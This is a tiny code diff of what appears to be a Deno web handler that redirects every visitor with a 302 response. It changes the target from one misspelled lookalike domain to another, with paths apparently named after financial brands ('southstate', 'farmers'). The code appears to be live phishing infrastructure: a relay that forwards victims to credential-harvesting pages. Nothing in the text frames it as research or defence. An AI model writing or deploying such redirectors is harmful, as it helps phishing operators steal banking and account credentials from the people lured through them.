@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://revlewpotlatch1now.help/southstate",
+      Location: "https://myacountsrevlewtoday.de/rex/farmers/",
     },
   });
 });
